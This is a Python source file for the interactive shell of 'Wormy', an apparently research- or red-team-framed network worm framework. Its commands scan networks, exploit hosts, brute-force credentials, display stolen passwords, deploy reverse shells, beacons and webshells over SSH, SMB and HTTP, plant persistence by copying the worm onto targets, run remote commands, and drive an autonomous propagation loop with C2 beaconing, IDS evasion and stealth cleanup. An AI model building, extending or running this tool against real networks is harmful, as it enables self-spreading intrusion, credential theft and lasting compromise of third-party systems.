"""
Wormy — interactive REPL (``wormy shell``).

Live status banner, scan/exploit/persist commands, and reporting.
Extracted from the former root-level ``cli.py`` so it ships inside the
installed package.
"""

import cmd
import os
import shutil
import sys
import tempfile
import time
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from utils.logger import logger

from ._version import __version__

console = Console()


class InteractiveCLI(cmd.Cmd):
    """Interactive command shell for a live WormCore instance."""

    prompt = ""
    use_rawinput = False

    def __init__(self, worm):
        super().__init__()
        self.worm = worm
        self._start_time = time.time()
        self._cmd_count = 0
        self._update_prompt()

    # ── helpers ──────────────────────────────────────────────────────

    def _update_prompt(self):
        infected = len(self.worm.infected_hosts) if hasattr(self.worm, "infected_hosts") else 0
        scanned = len(self.worm.scan_results) if hasattr(self.worm, "scan_results") else 0
        status = (
            "[bold green]● RUNNING[/]" if getattr(self.worm, "running", False) else "[dim]○ IDLE[/]"
        )
        self.prompt = f"\n{status}  [bold cyan]wormy[/][dim]::{infected} infected[/][dim]::{scanned} hosts[/]\n> "

    def _uptime(self) -> str:
        elapsed = time.time() - self._start_time
        m, s = divmod(int(elapsed), 60)
        return f"{m}m {s}s" if m else f"{s}s"

    def _banner(self) -> Panel:
        infected = len(self.worm.infected_hosts) if hasattr(self.worm, "infected_hosts") else 0
        scanned = len(self.worm.scan_results) if hasattr(self.worm, "scan_results") else 0
        failed = len(self.worm.failed_targets) if hasattr(self.worm, "failed_targets") else 0
        creds = 0
        if hasattr(self.worm, "cred_manager") and self.worm.cred_manager:
            creds = len(self.worm.cred_manager.get_discovered_credentials())

        t = Table.grid(padding=(0, 2))
        t.add_column(style="bold cyan", justify="right")
        t.add_column(style="white")
        t.add_row("Targets", f"{scanned} scanned  |  {infected} infected  |  {failed} failed")
        t.add_row("Credentials", f"{creds} discovered")
        t.add_row("Uptime", self._uptime())
        t.add_row("Commands", str(self._cmd_count))

        status = "RUNNING" if getattr(self.worm, "running", False) else "IDLE"
        status_style = "green" if getattr(self.worm, "running", False) else "yellow"
        return Panel(
            t,
            title=f"[bold]Wormy[/] [dim]v{__version__}[/]  [{status_style}]{status}[/]",
            border_style="bright_blue",
            padding=(0, 1),
        )

    def _print_banner(self):
        console.print(self._banner())

    def _find_target(self, ip: str):
        return next((h for h in self.worm.scan_results if h["ip"] == ip), None)

    def _first_credential(self):
        if self.worm.cred_manager:
            creds = self.worm.cred_manager.get_discovered_credentials()
            if creds:
                return creds[0]
        return "root", ""

    # ── SCAN ─────────────────────────────────────────────────────────

    def do_scan(self, arg):
        """Scan the network. Usage: scan [professional|basic]"""
        use_pro = "basic" not in arg.lower()
        with console.status("[bold cyan]Scanning network...", spinner="dots"):
            results = self.worm.scan_network(use_professional=use_pro)

        if not results:
            console.print("[dim]No hosts discovered.[/]")
            return

        t = Table(title=f"[bold]{len(results)} hosts discovered[/]", border_style="bright_blue")
        t.add_column("IP", style="cyan", no_wrap=True)
        t.add_column("OS", style="white", max_width=16)
        t.add_column("Ports", style="yellow", max_width=30)
        t.add_column("Vulns", justify="center")
        t.add_column("Chains", justify="center")
        t.add_column("Status", justify="center")

        for h in results:
            ip = h["ip"]
            vulns = len(h.get("vulnerabilities", []))
            chain = len(h.get("exploit_chain", []))
            if ip in self.worm.infected_hosts:
                st = "[green]INFECTED[/]"
            elif ip in self.worm.failed_targets:
                st = "[red]FAILED[/]"
            else:
                st = "[dim]DISCOVERED[/]"

            t.add_row(
                ip,
                h.get("os_guess", "?")[:16],
                ", ".join(str(p) for p in h.get("open_ports", []))[:30],
                f"[red]{vulns}[/]" if vulns else "[dim]0[/]",
                f"[red bold]{chain}[/]" if chain else "[dim]0[/]",
                st,
            )
        console.print(t)
        self._update_prompt()

    # ── STATUS / TARGETS ─────────────────────────────────────────────

    def do_status(self, arg):
        """Show current status"""
        self._print_banner()
        self.worm.print_status()

    def do_targets(self, arg):
        """List discovered targets"""
        t = Table(border_style="bright_blue")
        t.add_column("Status", justify="center")
        t.add_column("IP", style="cyan")
        t.add_column("OS")
        t.add_column("Ports", style="yellow")

        for h in self.worm.scan_results:
            ip = h["ip"]
            if ip in self.worm.infected_hosts:
                st = "[green]INFECTED[/]"
            elif ip in self.worm.failed_targets:
                st = "[red]FAILED[/]"
            else:
                st = "[dim]DISCOVERED[/]"
            t.add_row(
                st, ip, h.get("os_guess", "?"), ", ".join(str(p) for p in h.get("open_ports", []))
            )
        console.print(t)
        self._update_prompt()

    # ── EXPLOIT ──────────────────────────────────────────────────────

    def do_exploit(self, arg):
        """Exploit a target. Usage: exploit <ip>"""
        ip = arg.strip()
        if not ip:
            console.print("[red]Usage: exploit <ip>[/]")
            return
        target = self._find_target(ip)
        if not target:
            console.print(f"[red]Target {ip} not found[/]")
            return
        with console.status(f"[bold cyan]Exploiting {ip}...", spinner="dots"):
            success = self.worm.exploit_target(target)
        console.print("[green]Exploit succeeded[/]" if success else "[red]Exploit failed[/]")
        self._update_prompt()

    # ── VULNS ────────────────────────────────────────────────────────

    def do_vulns(self, arg):
        """Show vulnerabilities. Usage: vulns <ip>"""
        ip = arg.strip()
        if not ip:
            console.print("[red]Usage: vulns <ip>[/]")
            return
        for h in self.worm.scan_results:
            if h["ip"] == ip:
                vulns = h.get("vulnerabilities", [])
                if not vulns:
                    console.print(f"[dim]No vulnerabilities for {ip}[/]")
                    return
                t = Table(title=f"[bold]Vulnerabilities: {ip}[/]", border_style="bright_blue")
                t.add_column("Severity")
                t.add_column("Name")
                t.add_column("CVSS")
                t.add_column("CVE")
                for v in vulns:
                    sev = v.get("severity", "?").upper()
                    color = (
                        "red"
                        if sev in ("CRITICAL", "HIGH")
                        else "yellow" if sev == "MEDIUM" else "green"
                    )
                    t.add_row(
                        f"[{color}]{sev}[/]",
                        v.get("name", ""),
                        str(v.get("cvss", "")),
                        v.get("cve", "N/A"),
                    )
                console.print(t)
                return
        console.print(f"[red]Target {ip} not found[/]")

    # ── CHAIN ────────────────────────────────────────────────────────

    def do_chain(self, arg):
        """Show exploit chain. Usage: chain <ip>"""
        ip = arg.strip()
        if not ip:
            console.print("[red]Usage: chain <ip>[/]")
            return
        for h in self.worm.scan_results:
            if h["ip"] == ip:
                chain = h.get("exploit_chain", [])
                if not chain:
                    console.print(f"[dim]No exploit chain for {ip}[/]")
                    return
                t = Table(title=f"[bold]Exploit Chain: {ip}[/]", border_style="bright_blue")
                t.add_column("Step")
                t.add_column("Phase")
                t.add_column("Name")
                t.add_column("CVE")
                for s in chain:
                    t.add_row(str(s["step"]), s["phase"], s["name"], s.get("cve", "N/A"))
                console.print(t)
                return
        console.print(f"[red]Target {ip} not found[/]")

    # ── CREDS ────────────────────────────────────────────────────────

    def do_creds(self, arg):
        """Show discovered credentials"""
        if not self.worm.cred_manager:
            console.print("[dim]Credential manager unavailable[/]")
            return
        creds = self.worm.cred_manager.get_discovered_credentials()
        if not creds:
            console.print("[dim]No credentials discovered[/]")
            return
        t = Table(title=f"[bold]{len(creds)} credentials[/]", border_style="bright_blue")
        t.add_column("Username", style="cyan")
        t.add_column("Password", style="yellow")
        for u, p in creds:
            t.add_row(u, p)
        console.print(t)

    # ── MONITOR ──────────────────────────────────────────────────────

    def do_monitor(self, arg):
        """Show host monitoring dashboard"""
        if self.worm.host_monitor:
            self.worm.host_monitor.print_dashboard()
        else:
            console.print("[dim]Host Monitor unavailable[/]")

    do_hosts = do_monitor

    # ── EVASION ──────────────────────────────────────────────────────

    def do_evasion(self, arg):
        """Show evasion status"""
        t = Table(border_style="bright_blue", title="[bold]Evasion Status[/]")
        t.add_column("Component")
        t.add_column("Metric")
        t.add_column("Value")

        if self.worm.ids_evasion:
            stats = self.worm.ids_evasion.get_statistics()
            for k, v in stats.items():
                t.add_row("IDS/IPS", k.replace("_", " ").title(), str(v))
        if self.worm.polymorphic_engine:
            stats = self.worm.polymorphic_engine.get_statistics()
            for k, v in stats.items():
                t.add_row("Polymorphic", k.replace("_", " ").title(), str(v))
        console.print(t)

    # ── BRUTEFORCE ───────────────────────────────────────────────────

    def do_bruteforce(self, arg):
        """Brute force a target. Usage: bruteforce <ip> [service]"""
        parts = arg.strip().split()
        if not parts:
            console.print("[red]Usage: bruteforce <ip> [service][/]")
            return
        ip = parts[0]
        target = self._find_target(ip)
        if not target:
            console.print(f"[red]Target {ip} not found[/]")
            return
        if not self.worm.brute_force_engine:
            console.print("[dim]Brute Force Engine unavailable[/]")
            return
        with console.status(f"[bold cyan]Brute forcing {ip}...", spinner="dots"):
            results = self.worm._try_brute_force(target)
        if results:
            t = Table(title=f"[bold]Credentials: {ip}[/]", border_style="green")
            t.add_column("Service")
            t.add_column("Username")
            t.add_column("Password")
            for r in results:
                t.add_row(r.get("service", "?"), r.get("username", "?"), r.get("password", "?"))
            console.print(t)
        else:
            console.print(f"[red]Brute force failed on {ip}[/]")
        self._update_prompt()

    # ── GRAPH / TOPO ─────────────────────────────────────────────────

    def do_graph(self, arg):
        """Generate network topology visualization"""
        if not self.worm.host_monitor:
            console.print("[dim]Host Monitor unavailable[/]")
            return
        hosts = {
            h["ip"]: {"os_guess": h.get("os_guess", "?"), "open_ports": h.get("open_ports", [])}
            for h in self.worm.scan_results
        }
        from utils.topology_visualizer import TopologyVisualizer

        tv = TopologyVisualizer()
        lateral = []
        for ip in self.worm.host_monitor.hosts:
            for lm in self.worm.host_monitor.hosts[ip].lateral_movement_history:
                lateral.append({"source": ip, **lm})
        results = tv.generate_all(
            hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral
        )
        t = Table(border_style="bright_blue", title="[bold]Topology Maps[/]")
        t.add_column("Format")
        t.add_column("Path")
        for fmt, path in results.items():
            t.add_row(fmt, path)
        console.print(t)

    do_topo = do_graph

    # ── HOST ─────────────────────────────────────────────────────────

    def do_host(self, arg):
        """Show host details. Usage: host <ip>"""
        ip = arg.strip()
        if not ip or not self.worm.host_monitor:
            console.print(
                "[red]Usage: host <ip>[/]" if not ip else "[dim]Host Monitor unavailable[/]"
            )
            return
        status = self.worm.host_monitor.get_host_status(ip)
        if not status:
            console.print(f"[red]Host {ip} not found[/]")
            return
        t = Table(border_style="bright_blue", title=f"[bold]Host: {ip}[/]")
        t.add_column("Property", style="cyan")
        t.add_column("Value")
        for k, v in status.items():
            t.add_row(k.replace("_", " ").title(), str(v))
        console.print(t)

    do_h = do_host

    # ── ACTIVITY ─────────────────────────────────────────────────────

    def do_activity(self, arg):
        """Show recent activity. Usage: activity [limit]"""
        try:
            limit = int(arg.strip()) if arg.strip() else 20
        except ValueError:
            limit = 20
        if not self.worm.host_monitor:
            console.print("[dim]Host Monitor unavailable[/]")
            return
        activities = self.worm.host_monitor.get_activity_feed(limit=limit)
        if not activities:
            console.print("[dim]No activities recorded[/]")
            return
        t = Table(border_style="bright_blue", title=f"[bold]Activity ({len(activities)})[/]")
        t.add_column("Time", style="dim")
        t.add_column("Host", style="cyan")
        t.add_column("Type")
        t.add_column("Details", max_width=50)
        for a in activities:
            t.add_row(
                a["timestamp"][11:19], a["host_ip"], a["type"], str(a.get("details", ""))[:50]
            )
        console.print(t)

    # ── PIVOT ────────────────────────────────────────────────────────

    def do_pivot(self, arg):
        """Show lateral movement options. Usage: pivot <source_ip>"""
        ip = arg.strip()
        if not ip:
            console.print("[red]Usage: pivot <source_ip>[/]")
            return
        if self.worm.knowledge_graph:
            reachable = self.worm.knowledge_graph.get_reachable_from(ip)
            console.print(f"[bold]Reachable from {ip}:[/] {reachable}")

    # ── DEPLOY ───────────────────────────────────────────────────────

    def do_deploy(self, arg):
        """Deploy payload. Usage: deploy <ip> [reverse_shell|beacon|webshell]"""
        parts = arg.strip().split()
        if not parts:
            console.print("[red]Usage: deploy <ip> [type][/]")
            return
        ip = parts[0]
        ptype = parts[1] if len(parts) > 1 else "beacon"
        if not self.worm.payload_deployer:
            console.print("[dim]Payload Deployer unavailable[/]")
            return
        target = self._find_target(ip)
        if not target:
            console.print(f"[red]Target {ip} not found[/]")
            return
        ports = target.get("open_ports", [])
        username, password = self._first_credential()
        success = False
        ssh_ports = (22, 2222, 2200, 2022, 8022)
        for port in ports:
            if port in ssh_ports:
                success = self.worm.payload_deployer.deploy_via_ssh(
                    ip, port, username, password, payload_type=ptype
                )
                if success:
                    break
            elif port in (445, 139):
                success = self.worm.payload_deployer.deploy_via_smb(
                    ip, username, password, payload_type=ptype
                )
                if success:
                    break
            elif port in (80, 443, 8080):
                success = self.worm.payload_deployer.deploy_webshell(ip, port, username, password)
                if success:
                    break
        console.print(
            f"[green]Deploy succeeded on {ip}[/]" if success else f"[red]Deploy failed on {ip}[/]"
        )
        self._update_prompt()

    # ── PERSIST ──────────────────────────────────────────────────────

    def _resolve_payload_path(self) -> str:
        """Locate a sensible payload file to persist on a target.

        Preference order: the ``wormy`` launcher at the project root, the
        ``wormy`` binary on PATH, or a generated bootstrap script that
        runs ``python -m worm_core`` (the package itself is not a single
        copyable file anymore).
        """
        repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        candidates = [os.path.join(repo_root, "wormy"), shutil.which("wormy")]
        for c in candidates:
            if c and os.path.isfile(c):
                return c
        bootstrap = os.path.join(tempfile.gettempdir(), "wormy_bootstrap.py")
        if not os.path.exists(bootstrap):
            with open(bootstrap, "w", encoding="utf-8") as fh:
                fh.write("#!/usr/bin/env python3\n")
                fh.write("# Bootstrap generated by wormy shell - launches the worm engine.\n")
                fh.write("import sys\n\nfrom worm_core.cli import main\n\nsys.exit(main())\n")
        return bootstrap

    def do_persist(self, arg):
        """Establish persistence. Usage: persist <ip> [methods]"""
        parts = arg.strip().split()
        if not parts:
            console.print("[red]Usage: persist <ip> [methods][/]")
            return
        ip = parts[0]
        if not self.worm.remote_persistence:
            console.print("[dim]Remote Persistence unavailable[/]")
            return
        target = self._find_target(ip)
        username, password = self._first_credential()
        ssh_ports = (22, 2222, 2200, 2022, 8022)
        ssh_port = 22
        if target:
            for p in target.get("open_ports", []):
                if p in ssh_ports:
                    ssh_port = p
                    break
        worm_path = self._resolve_payload_path()
        results = self.worm.remote_persistence.establish(
            ip=ip,
            os_type=target.get("os_guess", "Unknown") if target else "Unknown",
            username=username,
            password=password,
            payload_path=worm_path,
            methods=parts[1:] if len(parts) > 1 else None,
            ssh_port=ssh_port,
        )
        if results:
            console.print(f"[green]Persistence on {ip}:[/] {[r['method'] for r in results]}")
        else:
            console.print(f"[red]Persistence failed on {ip}[/]")
        self._update_prompt()

    # ── EXEC ─────────────────────────────────────────────────────────

    def do_exec(self, arg):
        """Execute command. Usage: exec <ip> <command>"""
        parts = arg.strip().split(maxsplit=1)
        if len(parts) < 2:
            console.print("[red]Usage: exec <ip> <command>[/]")
            return
        ip, command = parts
        if not self.worm.agent_controller:
            console.print("[dim]Agent Controller unavailable[/]")
            return
        try:
            # Agent ids derive from ip:username, so look the agent up by IP
            # instead of guessing "root" (only matched root-owned agents).
            agent = self.worm.agent_controller.find_by_ip(ip)
            if agent is None:
                console.print(f"[red]No registered agent for {ip}[/]")
                return
            rc, output = self.worm.agent_controller.execute_now(agent.agent_id, command)
            console.print(
                f"[bold]Output from {ip}[/] (agent={agent.agent_id}, user={agent.username}, rc={rc})"
            )
            console.print(output if output else "[dim](no output)[/]")
        except Exception as e:  # noqa: BLE001 — user-facing command error
            console.print(f"[red]Command failed: {e}[/]")

    do_e = do_exec

    # ── RUN ──────────────────────────────────────────────────────────

    def do_run(self, arg):
        """Start propagation. Usage: run [iterations]"""
        try:
            max_iter = int(arg.strip()) if arg.strip() else 0
        except ValueError:
            max_iter = 0

        self.worm.running = True
        self.worm.start_time = datetime.now()
        self.worm.stats["start_time"] = self.worm.start_time

        from .standalone import get_local_ip

        local_ip = get_local_ip()
        self.worm._safe_add_infected(local_ip)
        if self.worm.knowledge_graph:
            self.worm.knowledge_graph.add_host(local_ip, is_infected=True)
            self.worm.knowledge_graph.mark_infected(local_ip, "origin")

        with console.status("[bold cyan]Scanning...", spinner="dots"):
            self.worm.scan_network()

        iteration = 0
        online_learning_interval = 10
        adaptive_cycle_interval = 5

        while self.worm.running and self.worm.check_safety_constraints():
            iteration += 1
            if max_iter > 0 and iteration > max_iter:
                break

            console.print(f"\n[bold cyan]━ Iteration {iteration} ━[/]")

            if iteration % 5 == 0:
                with console.status("[dim]Rescanning...", spinner="dots"):
                    self.worm.scan_network()

            if self.worm.adaptive_cycle and iteration % adaptive_cycle_interval == 0:
                self.worm._run_adaptive_cycle(iteration)

            if self.worm.cred_manager and iteration % 3 == 0:
                self.worm._credential_pivot_cycle()

            if self.worm.config.ml.online_learning and iteration % online_learning_interval == 0:
                self.worm._online_learning_step()

            if self.worm.c2_server and getattr(self.worm.c2_server, "pending_brain_update", None):
                try:
                    update_path = self.worm.c2_server.pending_brain_update
                    if os.path.exists(update_path):
                        self.worm.rl_agent.load(update_path)
                        console.print("[green]OTA Brain Update applied[/]")
                        self.worm.c2_server.pending_brain_update = None
                        os.remove(update_path)
                except Exception as e:  # noqa: BLE001 — optional OTA path
                    logger.debug(f"OTA update failed: {e}")

            if self.worm.distributed_redundancy and iteration % 10 == 0:
                self.worm._check_distributed_redundancy()

            target = self.worm.select_next_target()
            if not target:
                console.print("[yellow]No more targets[/]")
                break

            with console.status(f"[bold cyan]Exploiting {target['ip']}...", spinner="dots"):
                self.worm.exploit_target(target)

            if self.worm.config.evasion.stealth_mode:
                self.worm._post_exploitation_cleanup(target["ip"], target)

            if self.worm.c2_server and target["ip"] in self.worm.infected_hosts:
                try:
                    self.worm.c2_server.process_beacon(
                        {
                            "host_id": target["ip"],
                            "ip": target["ip"],
                            "hostname": target.get("hostname", "unknown"),
                            "os": target.get("os_guess", "Unknown"),
                            "ports": target.get("open_ports", []),
                            "beacon_type": "infection",
                        }
                    )
                except Exception:  # noqa: BLE001 — beacon reporting is best-effort
                    pass

            if (
                self.worm.wave_propagation
                and iteration % 3 == 0
                and len(self.worm.infected_hosts) > 1
            ):
                try:
                    targets = [
                        h
                        for h in self.worm.scan_results
                        if h["ip"] not in self.worm.infected_hosts
                        and h["ip"] not in self.worm.failed_targets
                    ]
                    if targets and self.worm.cred_manager:
                        creds = self.worm.cred_manager.get_discovered_credentials()
                        if creds:
                            self.worm.wave_propagation.propagate_wave(
                                targets=targets,
                                credentials=creds,
                                exploit_fn=self.worm.exploit_target,
                                wave=iteration // 3,
                            )
                except Exception:  # noqa: BLE001 — wave propagation is best-effort
                    pass

            if self.worm.agent_controller and iteration % 2 == 0:
                try:
                    self.worm.agent_controller.heartbeat_check()
                except Exception:  # noqa: BLE001 — heartbeat is best-effort
                    pass

            if self.worm.config.propagation.propagation_delay > 0:
                time.sleep(self.worm.config.propagation.propagation_delay)

            if self.worm._safe_infection_count() >= self.worm.config.propagation.max_infections:
                break

            self._update_prompt()
            self._print_banner()

        self.worm.stats["end_time"] = datetime.now()
        self.worm.running = False
        self.worm.print_final_report()

    do_r = do_run

    # ── STOP / REPORT ────────────────────────────────────────────────

    def do_stop(self, arg):
        """Stop propagation"""
        self.worm.stop()
        console.print("[yellow]Propagation stopped[/]")

    def do_report(self, arg):
        """Generate audit report"""
        self.worm.print_final_report()

    # ── TRAIN ────────────────────────────────────────────────────────

    def do_train(self, arg):
        """Train ML models. Usage: train [rl|classifier|evasion|all]"""
        model = arg.strip().lower() if arg.strip() else "all"
        console.print(Panel.fit("[bold]ML Model Training[/]", border_style="bright_blue"))
        trained = []

        if model in ("classifier", "all"):
            console.print("\n[cyan]Training Host Classifier...[/]")
            try:
                from ml_models.train_host_classifier import main as train_classifier

                train_classifier()
                trained.append("Host Classifier")
            except Exception as e:  # noqa: BLE001 — report and continue
                console.print(f"[red]Failed: {e}[/]")

        if model in ("evasion", "all"):
            console.print("\n[cyan]Training Evasion Model...[/]")
            try:
                from ml_models.train_evasion_model import main as train_evasion

                train_evasion()
                trained.append("Evasion Model")
            except Exception as e:  # noqa: BLE001 — report and continue
                console.print(f"[red]Failed: {e}[/]")

        if model in ("rl", "all"):
            console.print("\n[cyan]Training RL Agent...[/]")
            try:
                from ml_models.train_rl_agent import train_agent_curriculum

                train_agent_curriculum()
                trained.append("RL Agent")
            except Exception as e:  # noqa: BLE001 — report and continue
                console.print(f"[red]Failed: {e}[/]")

        if trained:
            console.print(f"\n[green]Trained: {', '.join(trained)}[/]")
        else:
            console.print("[yellow]No models trained. Usage: train [rl|classifier|evasion|all][/]")
            logger.warning("No models trained")

    # ── HELP / EXIT ──────────────────────────────────────────────────

    def do_help(self, arg):
        """Show help"""
        t = Table(border_style="bright_blue", title="[bold]Commands[/]")
        t.add_column("Command", style="cyan")
        t.add_column("Description")
        commands = [
            ("scan [pro|basic]", "Scan network for hosts"),
            ("targets", "List discovered targets"),
            ("vulns <ip>", "Show vulnerabilities"),
            ("chain <ip>", "Show exploit chain"),
            ("exploit <ip>", "Exploit a target"),
            ("bruteforce <ip>", "Brute force credentials"),
            ("deploy <ip> [type]", "Deploy payload"),
            ("persist <ip> [methods]", "Establish persistence"),
            ("exec <ip> <cmd>", "Execute command via agent"),
            ("status", "Show current status"),
            ("hosts", "Host monitoring dashboard"),
            ("host <ip>", "Host details"),
            ("activity [n]", "Recent activity feed"),
            ("pivot <ip>", "Lateral movement options"),
            ("evasion", "Evasion statistics"),
            ("creds", "Discovered credentials"),
            ("topo", "Network topology map"),
            ("run [n]", "Start propagation"),
            ("stop", "Stop propagation"),
            ("train [model]", "Train ML models"),
            ("report", "Audit report"),
            ("version", "Show version"),
            ("exit", "Exit CLI"),
        ]
        for cmd_name, desc in commands:
            t.add_row(cmd_name, desc)
        console.print(t)

    def do_version(self, arg):
        """Show version information"""
        console.print(f"[bold]Wormy[/] v{__version__} (python {sys.version.split()[0]})")

    def do_exit(self, arg):
        """Exit the CLI"""
        console.print("[yellow]Exiting...[/]")
        self.worm.shutdown()
        return True

    do_quit = do_exit
    do_q = do_exit

    # ── SHORT ALIASES ────────────────────────────────────────────────

    do_s = do_scan
    do_x = do_exploit
    do_t = do_targets
    do_c = do_creds
    do_v = do_vulns

    # ── CMD LOOP HOOKS ───────────────────────────────────────────────

    def precmd(self, line):
        self._cmd_count += 1
        return super().precmd(line)

    def postcmd(self, stop, line):
        self._update_prompt()
        return super().postcmd(stop, line)

    def do_EOF(self, arg):
        print()
        return self.do_exit(arg)


# Backwards compatibility alias
WormyCLI = InteractiveCLI
